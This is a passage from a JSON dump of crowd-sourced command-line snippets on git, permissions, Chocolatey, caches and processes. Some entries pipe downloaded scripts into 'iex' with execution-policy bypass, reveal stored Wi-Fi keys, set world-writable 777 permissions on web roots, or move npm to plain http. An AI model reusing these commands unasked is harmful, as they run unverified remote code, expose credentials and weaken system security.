    "reg_date": "2021-10-11T22:02:37.000Z"
  },
  {
    "id": 912,
    "keyword": null,
    "link": null,
    "title": " checklist github readme",
    "description": "### Solar System Exploration, 1950s &ndash; 1960s  - [ ] Mercury - [x] Venus - [x] Earth (Orbit/Moon) - [x] Mars - [ ] Jupiter - [ ] Saturn - [ ] Uranus - [ ] Neptune - [ ] Comet Haley\n",
    "reg_date": "2021-10-11T22:02:38.000Z"
  },
  {
    "id": 913,
    "keyword": null,
    "link": null,
    "title": " checkout file from another branch",
    "description": "git checkout master -- myplugin.js\n",
    "reg_date": "2021-10-11T22:02:38.000Z"
  },
  {
    "id": 914,
    "keyword": null,
    "link": null,
    "title": " chmod: Unable to change file mode Operation not permitted",
    "description": "$ sudo chmod -R +rwX . \n$ sudo chown -R $(whoami) . \n",
    "reg_date": "2021-10-11T22:02:38.000Z"
  },
  {
    "id": 915,
    "keyword": null,
    "link": null,
    "title": " chmod 777",
    "description": "chmod -R 777 directory\nfind /opt/lampp/htdocs -type d -exec chmod 755 {} \\; find /opt/lampp/htdocs -type f -exec chmod 644 {} \\;\nchmod -R 777 your_directory_name \nSetting 777 permissions to a file or directory  means that it will be readable, writable and executable by all users and may pose a huge security risk\n",
    "reg_date": "2021-10-11T22:02:38.000Z"
  },
  {
    "id": 916,
    "keyword": null,
    "link": null,
    "title": " chmod 777 ubuntu xampp",
    "description": "sudo chmod -R 777 /opt/lampp/htdocs\n",
    "reg_date": "2021-10-11T22:02:38.000Z"
  },
  {
    "id": 917,
    "keyword": null,
    "link": null,
    "title": " chmod read only command in linux",
    "description": "chmod 0444 /var/www/html/*\n",
    "reg_date": "2021-10-11T22:02:39.000Z"
  },
  {
    "id": 918,
    "keyword": null,
    "link": null,
    "title": " chmode ubuntu",
    "description": "sudo chmod -R 777 /var/www \n",
    "reg_date": "2021-10-11T22:02:39.000Z"
  },
  {
    "id": 919,
    "keyword": null,
    "link": null,
    "title": " choco install python",
    "description": "choco install python --pre (For the latest prerelease) choco install python --version=3.8.0 (For version 3.8.0, follow that syntax to install any version)\n",
    "reg_date": "2021-10-11T22:02:39.000Z"
  },
  {
    "id": 920,
    "keyword": null,
    "link": null,
    "title": " choco installation",
    "description": "@\"%SystemRoot%\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -NoProfile -InputFormat None -ExecutionPolicy Bypass -Command \" [System.Net.ServicePointManager]::SecurityProtocol = 3072; iex ((New-Object System.Net.WebClient).DownloadString('https://chocolatey.org/install.ps1'))\" && SET \"PATH=%PATH%;%ALLUSERSPROFILE%\\chocolatey\\bin\"\n",
    "reg_date": "2021-10-11T22:02:39.000Z"
  },
  {
    "id": 921,
    "keyword": null,
    "link": null,
    "title": " choco list installed",
    "description": "$ choco list --localonly\n",
    "reg_date": "2021-10-11T22:02:39.000Z"
  },
  {
    "id": 922,
    "keyword": null,
    "link": null,
    "title": " choco update node",
    "description": "choco upgrade nodejs\n",
    "reg_date": "2021-10-11T22:02:39.000Z"
  },
  {
    "id": 923,
    "keyword": null,
    "link": null,
    "title": " choco upgrade all",
    "description": "choco upgrade all\nchoco upgrade all choco upgrade all --except=\"'skype,conemu'\"\npip list --outdated --format=freeze | grep -v '^\\-e' | cut -d = -f 1  | xargs -n1 pip install -U \n",
    "reg_date": "2021-10-11T22:02:40.000Z"
  },
  {
    "id": 924,
    "keyword": null,
    "link": null,
    "title": " chocolatey installation",
    "description": "# Run Powrshell as admin  Copy Paste this  Set-ExecutionPolicy Bypass -Scope Process -Force; [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072; iex ((New-Object System.Net.WebClient).DownloadString('https://chocolatey.org/install.ps1'))\n@\"%SystemRoot%\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -NoProfile -InputFormat None -ExecutionPolicy Bypass -Command \" [System.Net.ServicePointManager]::SecurityProtocol = 3072; iex ((New-Object System.Net.WebClient).DownloadString('https://chocolatey.org/install.ps1'))\" && SET \"PATH=%PATH%;%ALLUSERSPROFILE%\\chocolatey\\bin\"\nSet-ExecutionPolicy Bypass -Scope Process -Force; [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072; iex ((New-Object System.Net.WebClient).DownloadString('https://chocolatey.org/install.ps1'))\n#Install Chocolatey #region echo \"Setting up Chocolatey software package manager\" New-PSDrive -Name HKCR -PSProvider Registry -Root HKEY_CLASSES_ROOT  Get-PackageProvider -Name chocolatey -Force  echo \"Setting up Full Chocolatey Install\" Install-Package -Name Chocolatey -Force -ProviderName chocolatey $chocopath = (Get-Package chocolatey |              ?{$_.Name -eq \"chocolatey\"} |                  Select @{N=\"Source\";E={((($a=($_.Source -split \"\\\\\"))[0..($a.length - 2)]) -join \"\\\"),\"Tools\\chocolateyInstall\" -join \"\\\"}} |                      Select -ExpandProperty Source) & $chocopath \"upgrade all -y\" choco install chocolatey-core.extension --force  echo \"Creating daily task to automatically upgrade Chocolatey packages\" # adapted from https://blogs.technet.microsoft.com/heyscriptingguy/2013/11/23/using-scheduled-tasks-and-scheduled-jobs-in-powershell/ $ScheduledJob = @{     Name = \"Chocolatey Daily Upgrade\"     ScriptBlock = {choco upgrade all -y}     Trigger = New-JobTrigger -Daily -at 2am     ScheduledJobOption = New-ScheduledJobOption -RunElevated -MultipleInstancePolicy StopExisting -RequireNetwork } Register-ScheduledJob @ScheduledJob #endregion  #Update Powershell #region $ErrorActionPreference = \"silentlycontinue\"  $PSVersionTable.PSVersion choco install powershell -y choco upgrade powershell -y  $ErrorActionPreference = \"continue\" #endregion \n",
    "reg_date": "2021-10-11T22:02:40.000Z"
  },
  {
    "id": 925,
    "keyword": null,
    "link": null,
    "title": " chocolatey list installed",
    "description": "choco list --local-only \nSome packages are installed under ChocolateyInstall\\lib, others  - especially packages that are based on Windows installers (.msi files)  - install to the default path of the original installer (which is most likely within Program Files).\n",
    "reg_date": "2021-10-11T22:02:40.000Z"
  },
  {
    "id": 926,
    "keyword": null,
    "link": null,
    "title": " chown directory",
    "description": "sudo chown -R $USER ~/.blabla\nsudo chown -R $USER ~/.blabla \n",
    "reg_date": "2021-10-11T22:02:40.000Z"
  },
  {
    "id": 927,
    "keyword": null,
    "link": null,
    "title": " chrome import passwords",
    "description": "In Chrome address bar:\t\t\t\t'chrome://flags' > 'Password import' > Select 'Enabled' in dropdown menu > Relaunch ... (top-right) > 'Settings' > 'Passwords' ... (Saved Passwords) > 'Import' > Select your CSV file\n",
    "reg_date": "2021-10-11T22:02:40.000Z"
  },
  {
    "id": 928,
    "keyword": null,
    "link": null,
    "title": " chrome remote device debugging",
    "description": "chrome://inspect#devices\nchrome://inspect#devices.\nchrome.exe --remote-debugging-port=9222\n",
    "reg_date": "2021-10-11T22:02:40.000Z"
  },
  {
    "id": 929,
    "keyword": null,
    "link": null,
    "title": " chrome skia shader compilation error",
    "description": "# Open the terminal, navigate to your folder and type: flutter run --enable-software-rendering  # and run again.\n",
    "reg_date": "2021-10-11T22:02:40.000Z"
  },
  {
    "id": 930,
    "keyword": null,
    "link": null,
    "title": " chrome update ubuntu 20.04",
    "description": "sudo apt-get update sudo apt-get --only-upgrade install google-chrome-stable\nsudo apt-get update sudo apt-get --only-upgrade install google-chrome-stable https://askubuntu.com/questions/1275967/how-to-update-chrome-in-ubuntu-20-04\n",
    "reg_date": "2021-10-11T22:02:41.000Z"
  },
  {
    "id": 931,
    "keyword": null,
    "link": null,
    "title": " chromium for linux",
    "description": "sudo apt install -y chromium-browser # You can also install it from the software center\n",
    "reg_date": "2021-10-11T22:02:41.000Z"
  },
  {
    "id": 932,
    "keyword": null,
    "link": null,
    "title": " chroot: failed to run command ‘/bin/zsh’: No such file or directory",
    "description": "# This type of error occurs when chroot doesn't find the zsh binary in # /bin of the 'new root directory'.  root@root~$: ls debian-stretch   root@root~$: sudo chroot debian-stretch chroot: failed to run command &lsquo;/bin/zsh&rsquo;: No such file or directory  root@root~$: cp /bin/zsh debian-stretch/bin/.  root@root~$: cp /lib/x86_64-linux-gnu/libcap.so.2  \tlibdl.so.2 => /lib/x86_64-linux-gnu/libdl.so.2  \tlibtinfo.so.5 => /lib/x86_64-linux-gnu/libtinfo.so.5      libm.so.6 => /lib/x86_64-linux-gnu/libm.so.6  \tlibc.so.6 => /lib/x86_64-linux-gnu/libc.so.6    \tdebian-stretch  root@root~$: sudo cp /usr/lib/x86_64-linux-gnu/zsh  \tdebian-stretch/usr/lib/x86_64-linux-gnu -r      # After all of this command u can therefore run the chroot command  # normally\n",
    "reg_date": "2021-10-11T22:02:41.000Z"
  },
  {
    "id": 933,
    "keyword": null,
    "link": null,
    "title": " cisco save running config",
    "description": "Router# copy running-config startup-config\n",
    "reg_date": "2021-10-11T22:02:41.000Z"
  },
  {
    "id": 934,
    "keyword": null,
    "link": null,
    "title": " clamav install",
    "description": "# Answer for clamav install ubuntu 20.04  Installing ClamAV can be found for Ubuntu in the apt repository. Run this command to install ClamAV:  apt-get install clamav  If you need clamd, you may also want to run:  apt-get install clamav-daemon  If you require support for scanning compressed RAR files you first need to enable the non-free archive, and then you can install the RAR-plugin using:  apt-get install libclamunrar6\n",
    "reg_date": "2021-10-11T22:02:41.000Z"
  },
  {
    "id": 935,
    "keyword": null,
    "link": null,
    "title": " classic confinement requires snaps under /snap or symlink from /snap to /var/lib/snapd/snap",
    "description": "sudo ln -s /var/lib/snapd/snap /snap\n",
    "reg_date": "2021-10-11T22:02:41.000Z"
  },
  {
    "id": 936,
    "keyword": null,
    "link": null,
    "title": " clean cache in npm",
    "description": "# To clear a cache in npm, we need to run the npm cache clean --force command in our terminal: npm cache clean --force # clean: It deletes the all data from your cache folder.  # You can also verify the cache, by running the following command: npm cache verify\nnpm cache clean --force\n//npm clean cache:  npm cache clear --force npm cache rm --force npm cache verify \n",
    "reg_date": "2021-10-11T22:02:41.000Z"
  },
  {
    "id": 937,
    "keyword": null,
    "link": null,
    "title": " clean local branches git",
    "description": "git branch --merged master | grep -v '^[ *]*master$' | xargs git branch -d \n",
    "reg_date": "2021-10-11T22:02:41.000Z"
  },
  {
    "id": 938,
    "keyword": null,
    "link": null,
    "title": " clean uninstall ubuntu-desktop from ubuntu server",
    "description": "$~: sudo apt purge ubuntu-desktop -y && sudo apt autoremove -y && sudo apt autoclean\n",
    "reg_date": "2021-10-11T22:02:42.000Z"
  },
  {
    "id": 939,
    "keyword": null,
    "link": null,
    "title": " cleaning up your ubuntu system",
    "description": "sudo apt-get autoremove \nsudo apt-get clean \nsudo add-apt-repository ppa:utappia/stablesudo apt updatesudo apt install ucaresystem-core\nsudo ucaresystem-core\n",
    "reg_date": "2021-10-11T22:02:42.000Z"
  },
  {
    "id": 940,
    "keyword": null,
    "link": null,
    "title": " clear cache manjaro",
    "description": "sudo pacman -Sc  \n",
    "reg_date": "2021-10-11T22:02:42.000Z"
  },
  {
    "id": 941,
    "keyword": null,
    "link": null,
    "title": " clear cache ubuntu",
    "description": "# clear pagecache only. sync; echo 1 > /proc/sys/vm/drop_caches  # clear dentries and inodes. sync; echo 2 > /proc/sys/vm/drop_caches  # clear pagecache, dentries and inodes. sync; echo 3 > /proc/sys/vm/drop_caches \n$ sudo apt-get clean\n",
    "reg_date": "2021-10-11T22:02:44.000Z"
  },
  {
    "id": 942,
    "keyword": null,
    "link": null,
    "title": " clear cache yum centos 7",
    "description": "#To clean all cached packages from the enabled repository cache directory yum clean packages  #To purge the old package information completely yum clean headers  #To clean any cached xml metadata from any enabled repository, yum clean metadata  #To clean all the cached files from any enabled repository at once, yum clean all  #change yum file settings nano /etc/yum.conf http_caching=none\n",
    "reg_date": "2021-10-11T22:02:44.000Z"
  },
  {
    "id": 943,
    "keyword": null,
    "link": null,
    "title": " clear npm logs",
    "description": "$ npm cache clean or $ npm cache clean --force\n",
    "reg_date": "2021-10-11T22:02:44.000Z"
  },
  {
    "id": 944,
    "keyword": null,
    "link": null,
    "title": " clear ram cache ubuntu",
    "description": "# clear pagecache only. sync; echo 1 > /proc/sys/vm/drop_caches  # clear dentries and inodes. sync; echo 2 > /proc/sys/vm/drop_caches  # clear pagecache, dentries and inodes. sync; echo 3 > /proc/sys/vm/drop_caches \nsync && echo 3 | sudo tee /proc/sys/vm/drop_caches \nsync; echo 1 > /proc/sys/vm/drop_caches\nsync; echo 2 > /proc/sys/vm/drop_caches \n",
    "reg_date": "2021-10-11T22:02:44.000Z"
  },
  {
    "id": 945,
    "keyword": null,
    "link": null,
    "title": " clear ram linux",
    "description": "# clear pagecache only. sync; echo 1 > /proc/sys/vm/drop_caches  # clear dentries and inodes. sync; echo 2 > /proc/sys/vm/drop_caches  # clear pagecache, dentries and inodes. sync; echo 3 > /proc/sys/vm/drop_caches \nsudo sync; echo 3 > /proc/sys/vm/drop_caches\nsync; echo 1 > /proc/sys/vm/drop_caches\necho 2 > /proc/sys/vm/drop_caches \n",
    "reg_date": "2021-10-11T22:02:44.000Z"
  },
  {
    "id": 946,
    "keyword": null,
    "link": null,
    "title": " clear swap memory linux",
    "description": "sudo swapoff -a; sudo swapon -a\nsudo sync; echo 3 > /proc/sys/vm/drop_caches\n#!/bin/bash  free_mem=\"$(free | grep 'Mem:' | awk '{print $7}')\" used_swap=\"$(free | grep 'Swap:' | awk '{print $3}')\"  echo -e \"Free memory:\\t$free_mem kB ($((free_mem / 1024)) MiB)\\nUsed swap:\\t$used_swap kB ($((used_swap / 1024)) MiB)\" if [[ $used_swap -eq 0 ]]; then     echo \"No swap is in use.\" elif [[ $used_swap -lt $free_mem ]]; then     echo \"Freeing swap...\"     sudo swapoff -a     sudo swapon -a else     echo \"Not enough free memory. Exiting.\"     exit 1 fi\n",
    "reg_date": "2021-10-11T22:02:44.000Z"
  },
  {
    "id": 947,
    "keyword": null,
    "link": null,
    "title": " clearing dns cache",
    "description": "ipconfig /flushdns\n",
    "reg_date": "2021-10-11T22:02:45.000Z"
  },
  {
    "id": 948,
    "keyword": null,
    "link": null,
    "title": " cli generate random string",
    "description": "#purely random 12 character string openssl rand 12  # more useful random 12 character strings openssl rand -base64 12  # random hex-code sequence openssl rand -hex 12\n",
    "reg_date": "2021-10-11T22:02:45.000Z"
  },
  {
    "id": 949,
    "keyword": null,
    "link": null,
    "title": " clion WSL",
    "description": "MAKE SURE TO HAVE LATEST CLION BUILD Official Guide(non detailed):https://www.jetbrains.com/help/clion/how-to-use-wsl-development-environment-in-product.html#wsl-tooclhain  1) install wsl 1 or 2 on your windows machine 2) copy text from this script name it wsl.sh (doesnt matter the name)and run it in your WSL   https://github.com/JetBrains/clion-wsl/blob/master/ubuntu_setup_env.sh  it says ubuntu so only use WSL ubuntu unless you know what you are doing 3) open Clion and \"edit custom properties\" and add \"idea.case.sensitive.fs=true\"  watch the video in sources for more info 4) Go to clion settings and find the toolchains tab in the build section 5) then add a WSL toolchain 6) login with WSL using local host (port 2222)or ssh follow video for more info 7) press apply and ok and it should open terminal and set up cmake  8) for valgrind find the valgrind tab and input for the path that you get when you run the command \"which valgrind\" in WSL Sources: https://www.youtube.com/watch?v=xnwoCuHeHuY\n",
    "reg_date": "2021-10-11T22:02:45.000Z"
  },
  {
    "id": 950,
    "keyword": null,
    "link": null,
    "title": " clipboard in ubuntu",
    "description": "sudo apt-get install xclip\n",
    "reg_date": "2021-10-11T22:02:45.000Z"
  },
  {
    "id": 951,
    "keyword": null,
    "link": null,
    "title": " clone a branch",
    "description": "git clone --single-branch --branch <branchname> <remote-repo> \nIn general:  git clone -b <branch> <remote_repo>  Example:  git clone -b develop git@github.com:user/myproject.git\ngit clone -b <branchName> <remote_repo_url>\ngit clone -b <your_branchname> <your_git-remote-repo>\ngit clone --single-branch --branch <branchname> <remote-repo>  # eg git clone -b opencv-2.4 --single-branch https://github.com/Itseez/opencv.git\nclone a specific branch...  $ git clone -b <branchName> <clone with HTTPs link>\n",
    "reg_date": "2021-10-11T22:02:45.000Z"
  },
  {
    "id": 952,
    "keyword": null,
    "link": null,
    "title": " clone a conda environment",
    "description": "conda create -n myenv python=3.6 \nconda create --clone <env_name> --name <new_name>\nconda env export > environment_droplet.yml\nconda remove --name myenv --all \nconda create --name myclone --clone myenv\n",
    "reg_date": "2021-10-11T22:02:45.000Z"
  },
  {
    "id": 953,
    "keyword": null,
    "link": null,
    "title": " clone form branch",
    "description": "git clone --single-branch --branch <branchname> <remote-repo> \ngit clone -b <branch> <remote_repo> git clone -b my-branch git@github.com:user/myproject.git\ngit clone -b <branch> <remote_repo> \n",
    "reg_date": "2021-10-11T22:02:45.000Z"
  },
  {
    "id": 954,
    "keyword": null,
    "link": null,
    "title": " clone from a specific branch",
    "description": "git clone --single-branch --branch <branchname> <remote-repo> \ngit clone -b <branchName> <remote_repo_url>\n",
    "reg_date": "2021-10-11T22:02:46.000Z"
  },
  {
    "id": 955,
    "keyword": null,
    "link": null,
    "title": " clone specific branch",
    "description": "git clone --single-branch --branch <branchname> <remote-repo> \nIn general:  git clone -b <branch> <remote_repo>  Example:  git clone -b develop git@github.com:user/myproject.git\ngit clone -b <branchName> <remote_repo_url>\ngit clone -b branchName repoUrl\ngit clone --single-branch --branch master https://github.com/career-karma-tutorials/ck-git\ngit clone --branch <branchname> <remote-repo-url>\n",
    "reg_date": "2021-10-11T22:02:46.000Z"
  },
  {
    "id": 956,
    "keyword": null,
    "link": null,
    "title": " cloning kali-anonsurf in linux",
    "description": "#step1, paste the following command on your terminal. git clone https://github.com/Und3rf10w/kali-anonsurf.git #then navigate to the directory where kali-anonsurf is stored using cd command. for example cd /home/kali/ #type ./installer.sh to install the package. ./installer.sh #to start kali-anonsurf type anonsurf start\n",
    "reg_date": "2021-10-11T22:02:46.000Z"
  },
  {
    "id": 957,
    "keyword": null,
    "link": null,
    "title": " close all localhost connections",
    "description": "netstat -ano | findstr :yourPortNumber  taskkill /PID typeyourPIDhere /F\n",
    "reg_date": "2021-10-11T22:02:46.000Z"
  },
  {
    "id": 958,
    "keyword": null,
    "link": null,
    "title": " close chrome tab from command line ubuntu",
    "description": "Instead of closing a tab, it kills the tab (\"He's dead Jim\" message appears and tab remains): kill -9 <pid of Chrome tab> Closes all Chrome browsers open: killall chrome\n",
    "reg_date": "2021-10-11T22:02:46.000Z"
  },
  {
    "id": 959,
    "keyword": null,
    "link": null,
    "title": " cmake: not found",
    "description": "cmake --version\n",
    "reg_date": "2021-10-11T22:02:46.000Z"
  },
  {
    "id": 960,
    "keyword": null,
    "link": null,
    "title": " cmake version comand",
    "description": "cmake --version\n",
    "reg_date": "2021-10-11T22:02:46.000Z"
  },
  {
    "id": 961,
    "keyword": null,
    "link": null,
    "title": " cmd add to path",
    "description": "set PATH=%PATH%;C:\\your\\path\\here\\\n# update path only for the current session set PATH=%PATH%;C:\\your\\path\\here\\  # update the path permanently setx /M PATH \"%PATH%;C:\\your\\path\\here\\\"\nGo here  https://www.architectryan.com/2018/03/17/add-to-the-path-on-windows-10/\n// Windows Settings > System > About > Advanced system settings Environment variables\n",
    "reg_date": "2021-10-11T22:02:47.000Z"
  },
  {
    "id": 962,
    "keyword": null,
    "link": null,
    "title": " cmd clear dns cache",
    "description": "ipconfig /flushdns\n",
    "reg_date": "2021-10-11T22:02:47.000Z"
  },
  {
    "id": 963,
    "keyword": null,
    "link": null,
    "title": " cmd command to install xlrd version 1.2.0",
    "description": "pip install xlrd==1.2.0\n",
    "reg_date": "2021-10-11T22:02:47.000Z"
  },
  {
    "id": 964,
    "keyword": null,
    "link": null,
    "title": " cmd commands for wifi password",
    "description": "NETSH WLAN SHOW PROFILE WIFI KEY=CLEAR \n",
    "reg_date": "2021-10-11T22:02:47.000Z"
  },
  {
    "id": 965,
    "keyword": null,
    "link": null,
    "title": " cmd delete folder",
    "description": "# NOTE: for cmd/batch/DOS only (not bash/Linux)  # EXAMPLE: rmdir /s /q \"C:\\Users\\TomDickHarry\\DeletableStuff\"  # SYNTAX # rmdir /s /q \"<your-folder-to-delete>\"\n# for removing empty directory $ rmdir myDirectory  # to remove a directory that contains files and subdirectory $ rm -r myDirectory\n# for removing empty directory $ rmdir myDirectory  # to remove a directory that contains files and subdirectory $ rm -r myDirectory rm -rf /config/filegroups/*/  \ndel /S C:\\Path\\to\\directory\\* \nrmdir folder/path /S /Q\n Echo batch file to delete folder  @RD /S /Q \"D:\\testfolder\"  \n",
    "reg_date": "2021-10-11T22:02:47.000Z"
  },
  {
    "id": 966,
    "keyword": null,
    "link": null,
    "title": " cmd kill process",
    "description": "## check and kill used \"ports\" netstat -ano | findstr :8080 taskkill /PID <yourid> /F\nnetstat -ano | findstr :3000 taskkill /PID \"123\" /F \n// Kill process by exe name taskkill /IM \"ProcessName.exe\" /F\ntaskkill /PID 1234\ntaskkill /F /PID pid_number\nkill SIGNAL PID  #Example kill -9 3827  #See more information from : https://www.linux.com/training-tutorials/how-kill-process-command-line/\n",
    "reg_date": "2021-10-11T22:02:47.000Z"
  },
  {
    "id": 967,
    "keyword": null,
    "link": null,
    "title": " cmd kill process by pid",
    "description": "## check and kill used \"ports\" netstat -ano | findstr :8080 taskkill /PID <yourid> /F\n// Kill process by exe name taskkill /IM \"ProcessName.exe\" /F\nkill -9 PID # kill -9 94228\ntaskkill /F /PID pid_number\nkill SIGNAL PID  #Example kill -9 3827  #See more information from : https://www.linux.com/training-tutorials/how-kill-process-command-line/\nkill task by pid\n",
    "reg_date": "2021-10-11T22:02:47.000Z"
  },
  {
    "id": 968,
    "keyword": null,
    "link": null,
    "title": " cmd kill process on port",
    "description": "#To list any process listening to the port 8080: lsof -i:8080  #To kill any process listening to the port 8080: kill $(lsof -t -i:8080)  #or more violently: kill -9 $(lsof -t -i:8080)\nnetstat -ano | findstr :3001 taskkill /PID <yourid> /F\nnetstat -ano | findstr \"PORT_NUMBER\"  taskkill /PID PORT_NUMBER /f\nnetstat -ano | findstr :8080 taskkill /PID <yourid> /F\ntaskkill /F /PID PORT_NUMBER\n## check and kill used \"ports\" netstat -ano | findstr :8080 taskkill /PID <yourid> /F\n",
    "reg_date": "2021-10-11T22:02:48.000Z"
  },
  {
    "id": 969,
    "keyword": null,
    "link": null,
    "title": " cmd unzip windows",
    "description": "# Unzip files of the current directory calling the Powershell powershell -Command \"Get-ChildItem . -Filter *.zip | Expand-Archive -DestinationPath . -Force\"\necho unzi started powershell -Command \"Expand-Archive -Path advanced-systemcare-setup.zip -DestinationPath $env:USERPROFILE\\Desktop\" echo done pause\n",
    "reg_date": "2021-10-11T22:02:48.000Z"
  },
  {
    "id": 970,
    "keyword": null,
    "link": null,
    "title": " cmder search filter history",
    "description": "Press \"Ctrl\" + \"r\" and then type your substring to search in your history. Last matching command line will be found, keep using \"Ctrl\" + \"r\" to find previous ones. Once you find your searched command just press \"Enter\": (reverse-i-search)`searched_substring': command_with_searched_substring\n",
    "reg_date": "2021-10-11T22:02:48.000Z"
  },
  {
    "id": 971,
    "keyword": null,
    "link": null,
    "title": " cmder search filtered history",
    "description": "Press \"Ctrl\" + \"r\" and then type your substring to search in your history. Last matching command line will be found, keep using \"Ctrl\" + \"r\" to find previous ones. Once you find your searched command just press \"Enter\": (reverse-i-search)`searched_substring': command_with_searched_substring\n",
    "reg_date": "2021-10-11T22:02:48.000Z"
  },
  {
    "id": 972,
    "keyword": null,
    "link": null,
    "title": " cmder search histroy",
    "description": "Press \"Ctrl\" + \"r\" and then type your substring to search in your history. Last matching command line will be found, keep using \"Ctrl\" + \"r\" to find previous ones. Once you find your searched command just press \"Enter\": (reverse-i-search)`searched_substring': command_with_searched_substring\n",
    "reg_date": "2021-10-11T22:02:48.000Z"
  },
  {
    "id": 973,
    "keyword": null,
    "link": null,
    "title": " cocoa pods",
    "description": "$ sudo gem install cocoapods \n",
    "reg_date": "2021-10-11T22:02:49.000Z"
  },
  {
    "id": 974,
    "keyword": null,
    "link": null,
    "title": " code UNABLE TO GET ISSUER CERT LOCALLY",
    "description": "npm config set registry http://registry.npmjs.org/   \n",
    "reg_date": "2021-10-11T22:02:49.000Z"
  },
  {
    "id": 975,
    "keyword": null,
    "link": null,
    "title": " code blocks download for debian",
    "description": "$ sudo apt-get install codeblocks\n",
    "reg_date": "2021-10-11T22:02:50.000Z"
  },
  {
    "id": 976,
    "keyword": null,
    "link": null,
    "title": " codeigniter 4 install composer",
    "description": "composer create-project codeigniter4/appstarter project-root\ncomposer create-project codeigniter4/appstarter dwiFahrizal\n",
    "reg_date": "2021-10-11T22:02:50.000Z"
  },
  {
    "id": 977,
    "keyword": null,
    "link": null,
    "title": " colab ls size in mb",
    "description": "ls -l --block-size=M\n",
    "reg_date": "2021-10-11T22:02:50.000Z"
  },
  {
    "id": 978,
    "keyword": null,
    "link": null,
    "title": " colab unzip tar.gz",
    "description": "!tar -xvf /content/x.tar.gz\n!tar -xvf  'file.tar' -C 'destination'\n",
    "reg_date": "2021-10-11T22:02:50.000Z"
  },
  {
    "id": 979,
    "keyword": null,
    "link": null,
    "title": " command for moving files in linux",
    "description": "#mv filename destinationpath #for example: #moves a file named book from its original locations to the Desktop. mv book /home/kali/Desktop\n",
    "reg_date": "2021-10-11T22:02:50.000Z"
  },
  {
    "id": 980,
    "keyword": null,
    "link": null,
    "title": " command get user name",
    "description": "whoami\nJust type following command-line!! net user\n",
    "reg_date": "2021-10-11T22:02:50.000Z"
  },
  {
    "id": 981,
    "keyword": null,
    "link": null,
    "title": " command line how to find all files that have a string",
    "description": "grep -rnw '/path/to/somewhere/' -e 'pattern'\n",
    "reg_date": "2021-10-11T22:02:51.000Z"
  },
  {
    "id": 982,
    "keyword": null,
    "link": null,
    "title": " command line upload file ssh",
    "description": "scp <file to upload> <username>@<hostname>:<destination path>\n",
    "reg_date": "2021-10-11T22:02:51.000Z"
  },
  {
    "id": 983,
    "keyword": null,
    "link": null,
    "title": " command ng not foudn",
    "description": "npm i -g @angular/cli\n",
    "reg_date": "2021-10-11T22:02:51.000Z"
  },
  {
    "id": 984,
    "keyword": null,
    "link": null,
    "title": " command ng not found",
    "description": "The issue is simple, npm doesn't know about ng  Just run npm link @angular/cli and it should work seamlessly.\nnpm i -g @angular/cli\n",
    "reg_date": "2021-10-11T22:02:51.000Z"
  },
  {
    "id": 985,
    "keyword": null,
    "link": null,
    "title": " command not found: create-next-app",
    "description": "// 1st step npm install react next react-router // 2nd step npm i create-next-app // final step npx create-next-app my-awesome-app\nBefore create it manuely with  npm install react next react-router Try to install the create-next-app package  npm i create-next-app Then you can do again:  npx create-next-app my-awesome-app \n",
    "reg_date": "2021-10-11T22:02:51.000Z"
  },
  {
    "id": 986,
    "keyword": null,
    "link": null,
    "title": " command not found: lvim",
    "description": "$ PATH=$PATH:~/.local/bin $ export PATH $ lvim\n",
    "reg_date": "2021-10-11T22:02:52.000Z"
  },
  {
    "id": 987,
    "keyword": null,
    "link": null,
    "title": " command powershell create user",
    "description": "New-LocalUser \"NEW_ACCOUNT_NAME\" -Password $Password -FullName \"USER_FULL_NAME\" -Description \"Description of this account.\"\n",
    "reg_date": "2021-10-11T22:02:52.000Z"
  },
  {
    "id": 988,
    "keyword": null,
    "link": null,
    "title": " command powershell show wifi password",
    "description": "netsh wlan show profile name=\"NETWORK\" key=clear\nnetsh wlan show profiles\n",
    "reg_date": "2021-10-11T22:02:52.000Z"
  },
  {
    "id": 989,
    "keyword": null,
    "link": null,
    "title": " command prompt cd back",
    "description": "cd ..\\       -> To go back one level cd ..\\..\\    -> To go back two levels \n",
    "reg_date": "2021-10-11T22:02:52.000Z"
  },
  {
    "id": 990,
    "keyword": null,
    "link": null,
    "title": " command separate words into lines",
    "description": "Just use tr command for this purpose: tr -s '[[:punct:][:space:]]' '\\n' Example for cat file.txt | tr -s '[[:punct:][:space:]]' '\\n'\n",
    "reg_date": "2021-10-11T22:02:52.000Z"
  },
  {
    "id": 991,
    "keyword": null,
    "link": null,
    "title": " command to check mongodb version",
    "description": "mongod --version\nOpen the command prompt and type \"cd c:\\program files\\mongodb\\server\\your version\\bin\". After you enter the bin folder type \"mongo start\". If you get either a successful connection or failed one it means it's installed at least.\nmongo --version\n",
    "reg_date": "2021-10-11T22:02:52.000Z"
  },
  {
    "id": 992,
    "keyword": null,
    "link": null,
    "title": " command to check size of folder in linux",
    "description": "du -sh /var\ndf -sh .\ndu -lh --max-depth=1 --block-size=M | sort -nr\ndu -hs * | sort -rh\n",
    "reg_date": "2021-10-11T22:02:52.000Z"
  },
  {
    "id": 993,
    "keyword": null,
    "link": null,
    "title": " command to check what version of django is installed",
    "description": "python3 -m django --version // mac py -m django --version // windows\n",
    "reg_date": "2021-10-11T22:02:52.000Z"
  },
  {
    "id": 994,
    "keyword": null,
    "link": null,
    "title": " command to check working of  gpu in linux",
    "description": "nvidia-smi \n",
    "reg_date": "2021-10-11T22:02:53.000Z"
  },
  {
    "id": 995,
    "keyword": null,
    "link": null,
    "title": " command to compress folder linux",
    "description": "tar -czvf name-of-archive.tar.gz /path/to/directory-or-file\n",
    "reg_date": "2021-10-11T22:02:53.000Z"
  },
  {
    "id": 996,
    "keyword": null,
    "link": null,
    "title": " command to find the count of only words in a file in linux",
    "description": "wc -w <filename> wc --words <filename>\nwc -w /proc/cpuinfo\n",
    "reg_date": "2021-10-11T22:02:53.000Z"
  },
  {
    "id": 997,
    "keyword": null,
    "link": null,
    "title": " command to get number of commits",
    "description": "git rev-list --count HEAD\n",
    "reg_date": "2021-10-11T22:02:53.000Z"
  },
  {
    "id": 998,
    "keyword": null,
    "link": null,
    "title": " command to install firebase in raspberry",
    "description": "npm install -g firebase-tools\n",
    "reg_date": "2021-10-11T22:02:53.000Z"
  },
  {
    "id": 999,
    "keyword": null,
    "link": null,
    "title": " command to install react cli",
    "description": "npm install -g react-cli react \n",
